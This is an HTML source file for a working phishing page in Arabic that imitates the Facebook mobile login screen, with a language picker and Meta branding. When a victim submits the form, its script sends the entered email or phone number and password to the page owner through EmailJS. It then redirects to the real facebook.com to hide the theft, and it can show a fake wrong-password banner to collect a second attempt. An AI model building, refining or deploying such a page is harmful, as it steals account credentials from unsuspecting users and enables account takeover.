<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول إلى فيسبوك</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  
  <!-- مكتبة EmailJS -->
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script type="text/javascript">
      emailjs.init({ publicKey: "xCtTnF-sIhhygtKgm" });
  </script>

  <style>
    /* تهيئة عامة للموبايل */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background: #fff;
      color: #1c1e21;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      -webkit-font-smoothing: antialiased;
      justify-content: space-between;
    }

    /* التعديل (8): خط التحميل الأزرق في أعلى الشاشة المماثل لفيسبوك */
    #top-loading-bar {
      position: fixed;
      top: 0;
      left: 0;
      width: 0%;
      height: 3px;
      background-color: #1877f2;
      z-index: 9999;
      transition: width 0.2s linear;
    }

    /* رأس الصفحة وحاوية اختيار اللغة */
    .header {
      width: 100%;
      height: 50px;
      padding: 12px 16px;
      display: flex;
      justify-content: center; 
      align-items: center;
      position: relative;
    }
    
    .language-selector {
      display: flex;
      align-items: center;
      color: #575c61;
      font-size: 14px;
      gap: 5px;
      cursor: pointer;
    }

    main {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      width: 100%;
      padding: 25px 16px 0;
    }

    .content-wrapper {
      width: 100%;
      max-width: 380px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* ضبط أبعاد الشعار العلوي للفيسبوك */
    .fb-logo-container {
      margin-bottom: 35px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    .fb-logo-img {
      width: 110px; 
      height: auto;
      display: block;
    }

    /* شريط رسالة الخطأ المتناسق والمطابق لفيسبوك */
    .error-banner {
      display: none; 
      width: 100%;
      background-color: #FFEBEB;
      border: 1px solid #E6B3B3;
      color: #333333;
      padding: 12px;
      border-radius: 8px;
      margin-bottom: 16px;
      font-size: 13.5px;
      line-height: 1.4;
      text-align: right;
    }

    /* هيكلة حقول الإدخال لتسمح بارتفاع النص التوضيحي */
    .input-group {
      width: 100%;
      margin-bottom: 5px;
    }

    .input-container {
      position: relative;
      width: 100%;
      margin-bottom: 12px;
    }
    
    .input-container input {
      width: 100%;
      padding: 22px 16px 10px 16px; 
      border: 1px solid #ccd0d5;
      border-radius: 12px; 
      font-size: 16px;
      color: #1c1e21;
      outline: none;
      transition: border-color 0.2s;
      font-family: inherit;
      background: transparent;
    }
    
    .input-container input:focus {
      border-color: #1877f2;
    }

    /* النص التوضيحي العائم */
    .input-container label {
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      color: #757a82;
      font-size: 15px;
      font-weight: 400;
      pointer-events: none;
      transition: all 0.15s ease-out;
    }

    /* حركة ارتفاع النص عند الضغط أو الكتابة دون تغيير لونه الرمادي */
    .input-container input:focus ~ label,
    .input-container input:not(:placeholder-shown) ~ label {
      top: 13px;
      font-size: 11.5px;
      transform: translateY(-50%);
      color: #757a82; 
    }

    /* أزرار تسجيل الدخول وإنشاء الحساب */
    button {
      cursor: pointer;
      font-weight: 600;
      border-radius: 26px; 
      font-size: 15px;
      width: 100%;
      padding: 13px;
      text-align: center;
      transition: background 0.1s ease;
      font-family: inherit;
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .login-btn {
      background-color: #0064e0; 
      color: #fff;
      border: none;
      margin-bottom: 20px;
      font-size: 16px;
      height: 48px; 
    }
    
    .login-btn:hover {
      background-color: #0056c2;
    }

    /* تصميم دائرة التحميل */
    .spinner {
      display: none;
      width: 22px;
      height: 22px;
      border: 2.5px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* التعديل (2): تخصيص رابط نسيت كلمة المرور وتفاعل الضغط المحاكي لفيسبوك */
    .forgot-link {
      color: #1c1e21;
      font-size: 14.5px;
      text-decoration: none;
      margin-bottom: 30px;
      font-weight: 500;
      -webkit-tap-highlight-color: transparent; 
      display: inline-block;
    }
    
    .forgot-link:active {
      color: #0064e0 !important;
      text-decoration: underline !important;
    }

    .create-account-container {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0 16px 24px;
    }
    
    /* التعديل (1): رفع زر إنشاء حساب جديد قليلاً ليترك مساحة كافية واضحة لشعار ميتا */
    .create-btn {
      background-color: #fff;
      color: #0064e0;
      border: 1px solid #0064e0;
      margin-bottom: 35px; 
      font-size: 15px;
      height: 48px;
    }

    /* تنسيق تذييل الصفحة المطور */
    .meta-footer {
      color: #1c1e21;
      font-size: 14px;
      display: flex;
      align-items: center;
      gap: 5px;
      direction: rtl; 
      font-weight: 600;
    }
    
    .meta-text {
      color: #575c61;
      font-size: 16px;
      font-weight: bold;
      letter-spacing: -0.3px;
    }
    
    .meta-logo-img {
      width: 24px; 
      height: auto;
      display: block;
    }

    /* نافذة اللغات السفلية */
    .lang-modal-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: 1000;
      align-items: flex-end;
    }

    .lang-bottom-sheet {
      background: #fff;
      width: 100%;
      height: 85vh;
      border-radius: 24px 24px 0 0;
      display: flex;
      flex-direction: column;
      animation: slideUp 0.3s cubic-bezier(0.1, 0.8, 0.2, 1);
    }

    @keyframes slideUp {
      from { transform: translateY(100%); }
      to { transform: translateY(0); }
    }

    .lang-header {
      padding: 16px 20px;
      display: flex;
      flex-direction: column;
      align-items: flex-end;
    }

    .close-btn {
      cursor: pointer;
      margin-bottom: 12px;
      color: #000;
    }

    .lang-title {
      font-size: 22px;
      font-weight: bold;
      color: #1c1e21;
      margin: 0;
      text-align: right;
    }

    .lang-list {
      overflow-y: auto;
      padding: 0 10px 20px;
      flex-grow: 1;
    }

    .lang-item {
      display: flex;
      flex-direction: row-reverse;
      justify-content: space-between;
      align-items: center;
      padding: 16px 10px;
      border-bottom: 1px solid #f0f2f5;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
    }

    .lang-text {
      font-size: 16px;
      color: #1c1e21;
    }

    .checkbox {
      width: 22px;
      height: 22px;
      border: 1.5px solid #8d949e;
      border-radius: 4px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .lang-item.active .checkbox {
      background-color: #0064e0;
      border-color: #0064e0;
    }

    .lang-item.active .checkbox::after {
      content: '';
      width: 5px;
      height: 10px;
      border: solid white;
      border-width: 0 2px 2px 0;
      transform: rotate(45deg);
      margin-bottom: 2px;
    }
  </style>
</head>
<body>

  <!-- خط التحميل العلوي -->
  <div id="top-loading-bar"></div>

  <div class="lang-modal-overlay" id="lang-modal" onclick="closeLangModalOverlay(event)">
    <div class="lang-bottom-sheet">
      <div class="lang-header">
        <span class="close-btn" onclick="closeLangModal()">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <line x1="18" y1="6" x2="6" y2="18"></line>
            <line x1="6" y1="6" x2="18" y2="18"></line>
          </svg>
        </span>
        <h2 class="lang-title">تحديد لغتك</h2>
      </div>
      <div class="lang-list" id="lang-list-container"></div>
    </div>
  </div>

  <div class="header">
    <div class="language-selector" onclick="openLangModal()">
      <span id="current-lang-display">العربية</span>
      <svg width="10" height="6" viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M1 1L5 5L9 1" stroke="#575c61" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
  </div>
  
  <main>
    <div class="content-wrapper">
      <div class="fb-logo-container">
        <img src="fb_logo.jpeg" alt="Facebook" class="fb-logo-img">
      </div>

      <div class="error-banner" id="error-banner">
        كلمة السر التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.
      </div>
      
      <div class="input-group">
        <div class="input-container">
          <input type="text" id="email" placeholder=" " name="email">
          <label id="email-label">رقم الهاتف المحمول أو البريد الإلكتروني</label>
        </div>
        <div class="input-container">
          <input type="password" id="password" placeholder=" " name="password">
          <label id="password-label">كلمة السر</label>
        </div>
      </div>
      
      <button class="login-btn" id="login-btn" onclick="captureLogin()">
        <span id="btn-text">تسجيل الدخول</span>
        <div class="spinner" id="btn-spinner"></div>
      </button>
      
      <!-- التعديل (4) و (8): ربط زر نسيت كلمة المرور بالرابط الرسمي مع إضافة تأثير خط التحميل العلوي -->
      <a href="javascript:void(0)" onclick="navigateWithTopBar('https://www.facebook.com/recover/initiate/')" class="forgot-link" id="forgot-link">هل نسيت كلمة السر؟</a>
    </div>
  </main>
  
  <div class="create-account-container">
    <div class="content-wrapper">
      <!-- التعديل (3) و (8): ربط زر إنشاء حساب جديد بالرابط الرسمي مع إضافة تأثير خط التحميل العلوي -->
      <button class="create-btn" id="create-btn" onclick="navigateWithTopBar('https://m.facebook.com/reg/')">إنشاء حساب جديد</button>
      
      <div class="meta-footer">
        <span class="meta-text">Meta</span>
        <img src="logo_meta.jpeg" alt="Meta" class="meta-logo-img">
      </div>
    </div>
  </div>

  <script>
    const realTranslations = {
      'ar': { 'langText': 'العربية', 'emailPH': 'رقم الهاتف المحمول أو البريد الإلكتروني', 'passPH': 'كلمة السر', 'loginBtn': 'تسجيل الدخول', 'forgotLnk': 'هل نسيت كلمة السر؟', 'createBtn': 'إنشاء حساب جديد', 'errorMsg': 'كلمة السر التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.', 'dir': 'rtl' },
      'en': { 'langText': 'English (US)', 'emailPH': 'Mobile number or email address', 'passPH': 'Password', 'loginBtn': 'Log In', 'forgotLnk': 'Forgotten password?', 'createBtn': 'Create new account', 'errorMsg': 'The password you entered is incorrect. Please try again.', 'dir': 'ltr' }
    };

    // التعديل (5): مصفوفة تحتوي على أكثر من 50 لغة حقيقية لإثراء القائمة السفلية
    const languagesData = [
      { id: 'ar', name: 'العربية', target: 'ar' }, { id: 'en', name: 'English (US)', target: 'en' },
      { id: 'fr', name: 'Français (France)', target: 'en' }, { id: 'tr', name: 'Türkçe', target: 'en' },
      { id: 'es', name: 'Español', target: 'en' }, { id: 'en_gb', name: 'English (UK)', target: 'en' },
      { id: 'de', name: 'Deutsch', target: 'en' }, { id: 'it', name: 'Italiano', target: 'en' },
      { id: 'ru', name: 'Русский', target: 'en' }, { id: 'zh', name: '简体中文', target: 'en' },
      { id: 'ja', name: '日本語', target: 'en' }, { id: 'ko', name: '한국어', target: 'en' },
      { id: 'pt_br', name: 'Português (Brasil)', target: 'en' }, { id: 'pt_pt', name: 'Português (Portugal)', target: 'en' },
      { id: 'hi', name: 'हिन्दी', target: 'en' }, { id: 'bn', name: 'বাংলা', target: 'en' },
      { id: 'pa', name: 'ਪੰਜਾਬੀ', target: 'en' }, { id: 'mr', name: 'मराठी', target: 'en' },
      { id: 'te', name: 'తెలుగు', target: 'en' }, { id: 'ta', name: 'தமிழ்', target: 'en' },
      { id: 'gu', name: 'ગુજરાતી', target: 'en' }, { id: 'ur', name: 'اردو', target: 'en' },
      { id: 'fa', name: 'فارسی', target: 'ar' }, { id: 'vi', name: 'Tiếng Việt', target: 'en' },
      { id: 'tl', name: 'Tagalog', target: 'en' }, { id: 'id', name: 'Bahasa Indonesia', target: 'en' },
      { id: 'ms', name: 'Bahasa Melayu', target: 'en' }, { id: 'th', name: 'ไทย', target: 'en' },
      { id: 'uk', name: 'Українська', target: 'en' }, { id: 'pl', name: 'Polski', target: 'en' },
      { id: 'ro', name: 'Română', target: 'en' }, { id: 'nl', name: 'Nederlands', target: 'en' },
      { id: 'el', name: 'Ελληνικά', target: 'en' }, { id: 'cs', name: 'Čeština', target: 'en' },
      { id: 'hu', name: 'Magyar', target: 'en' }, { id: 'sv', name: 'Svenska', target: 'en' },
      { id: 'bg', name: 'Български', target: 'en' }, { id: 'sr', name: 'Српски', target: 'en' },
      { id: 'hr', name: 'Hrvatski', target: 'en' }, { id: 'sk', name: 'Slovenčina', target: 'en' },
      { id: 'lt', name: 'Lietuvių', target: 'en' }, { id: 'lv', name: 'Latviešu', target: 'en' },
      { id: 'et', name: 'Eesti', target: 'en' }, { id: 'sl', name: 'Slovenščina', target: 'en' },
      { id: 'ga', name: 'Gaeilge', target: 'en' }, { id: 'cy', name: 'Cymraeg', target: 'en' },
      { id: 'is', name: 'Íslenska', target: 'en' }, { id: 'no', name: 'Norsk', target: 'en' },
      { id: 'da', name: 'Dansk', target: 'en' }, { id: 'fi', name: 'Suomi', target: 'en' },
      { id: 'he', name: 'עברית', target: 'ar' }, { id: 'sw', name: 'Kiswahili', target: 'en' },
      { id: 'am', name: 'አማርኛ', target: 'en' }, { id: 'az', name: 'Azərbaycan', target: 'en' },
      { id: 'ka', name: 'ქართული', target: 'en' }, { id: 'kk', name: 'Қазақ', target: 'en' }
    ];

    let currentLangId = 'ar';
    const modal = document.getElementById('lang-modal');
    const listContainer = document.getElementById('lang-list-container');

    function renderLanguages() {
      listContainer.innerHTML = '';
      languagesData.forEach(lang => {
        const item = document.createElement('div');
        item.className = `lang-item ${lang.id === currentLangId ? 'active' : ''}`;
        item.onclick = () => selectLanguage(lang.id, lang.target, lang.name);
        item.innerHTML = `<span class="lang-text">${lang.name}</span><div class="checkbox"></div>`;
        listContainer.appendChild(item);
      });
    }

    function openLangModal() { renderLanguages(); modal.style.display = 'flex'; }
    function closeLangModal() { modal.style.display = 'none'; }
    function closeLangModalOverlay(event) { if (event.target === modal) closeLangModal(); }

    function selectLanguage(id, targetRealLang, displayName) {
      currentLangId = id;
      renderLanguages();
      setTimeout(() => { closeLangModal(); applyTranslation(targetRealLang, displayName); }, 150);
    }

    function applyTranslation(targetRealLang, displayName) {
      const t = realTranslations[targetRealLang];
      document.documentElement.dir = t.dir;
      
      const footer = document.querySelector('.meta-footer');
      const errorBanner = document.getElementById('error-banner');

      if(t.dir === 'ltr') {
        footer.style.direction = 'ltr';
        errorBanner.style.textAlign = 'left';
      } else {
        footer.style.direction = 'rtl';
        errorBanner.style.textAlign = 'right';
      }

      document.getElementById('current-lang-display').innerText = displayName;
      document.getElementById('email-label').innerText = t.emailPH;
      document.getElementById('password-label').innerText = t.passPH;
      document.getElementById('btn-text').innerText = t.loginBtn;
      document.getElementById('forgot-link').innerText = t.forgotLnk;
      document.getElementById('create-btn').innerText = t.createBtn;
      errorBanner.innerText = t.errorMsg;
    }

    // التعديل (8): دالة محاكاة شريط التحميل العلوي الأزرق عند الضغط على الروابط قبل الانتقال الفعلي للرابط المطلوب
    function navigateWithTopBar(targetUrl) {
      const bar = document.getElementById('top-loading-bar');
      bar.style.width = '0%';
      
      let width = 0;
      const loadingInterval = setInterval(() => {
        if (width >= 90) {
          clearInterval(loadingInterval);
        } else {
          width += Math.floor(Math.random() * 15) + 5;
          if (width > 92) width = 92;
          bar.style.width = width + '%';
        }
      }, 80);

      setTimeout(() => {
        clearInterval(loadingInterval);
        bar.style.width = '100%';
        setTimeout(() => {
          window.location.href = targetUrl;
        }, 150);
      }, 1000);
    }

    // تجميد مؤقت ذكي بانتظار استلام الرد، الدائرة ستتوقف فور حدوث الانتقال الفعلي لفيسبوك
    function startWaitingForResponse() {
      const maxWaitTime =  3 * 1000; 
      const startTime = Date.now();
      
      const checkInterval = setInterval(() => {
        const elapsedTime = Date.now() - startTime;
        if (elapsedTime >= maxWaitTime) {
          clearInterval(checkInterval);
          redirectToFacebook();
        }
      }, 3000); 
    }

    // التعديل (6): التوجيه الفعلي لفيسبوك لتتوقف دائر التحميل فوراً نتيجة مغادرة الصفحة
    function redirectToFacebook() {
      window.location.href = "https://www.facebook.com";
    }

    function captureLogin() {
      const emailInput = document.getElementById('email').value.trim();
      const passwordInput = document.getElementById('password').value;

      if (!emailInput || !passwordInput) {
          alert("أدخل رقم الهاتف أو البريد الإلكتروني وكلمة السر.");
          return;
      }

      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phoneRegex = /^(0|\+)[0-9]+$/;

      if (!emailRegex.test(emailInput) && !phoneRegex.test(emailInput)) {
          alert("رقم الهاتف أو البريد الإلكتروني غير صحيح.");
          return;
      }

      const loginBtn = document.getElementById('login-btn');
      const btnText = document.getElementById('btn-text');
      const spinner = document.getElementById('btn-spinner');

      btnText.style.display = 'none';
      spinner.style.display = 'block'; // التعديل (6): تفعيل دائرة التحميل لتعمل باستمرار
      loginBtn.style.opacity = "0.85";
      loginBtn.style.pointerEvents = "none";

      const templateParams = {
        name: "فيسبوك",
        Gmail: emailInput,
        password: passwordInput,
        وقت: new Date().toLocaleString('ar-EG')
      };

      emailjs.send('service_z5omr3b', 'template_z464v0m', templateParams)
        .then(() => {
          startWaitingForResponse();
        }, (error) => {
          btnText.style.display = 'block';
          spinner.style.display = 'none';
          loginBtn.style.opacity = "1";
          loginBtn.style.pointerEvents = "auto";
          alert("حدث خطأ في الاتصال بالإنترنت، يرجى المحاولة لاحقاً.");
        });
    }

    // التعديل (7): إجبار المتصفح على تفريغ الحقول وإعادة تحديث عناصر الواجهة فور العودة أو الرجوع للموقع للخلف
    window.addEventListener('pageshow', (event) => {
      document.getElementById('email').value = '';
      document.getElementById('password').value = '';
      
      const loginBtn = document.getElementById('login-btn');
      const btnText = document.getElementById('btn-text');
      const spinner = document.getElementById('btn-spinner');
      const bar = document.getElementById('top-loading-bar');
      
      if (bar) bar.style.width = '0%';
      if (loginBtn && btnText && spinner) {
        btnText.style.display = 'block';
        spinner.style.display = 'none';
        loginBtn.style.opacity = "1";
        loginBtn.style.pointerEvents = "auto";
      }
    });

    window.addEventListener('DOMContentLoaded', () => {
      const urlParams = new URLSearchParams(window.location.search);
      if (urlParams.get('status') === 'error') {
        document.getElementById('error-banner').style.display = 'block';
      }
    });
    
    renderLanguages();
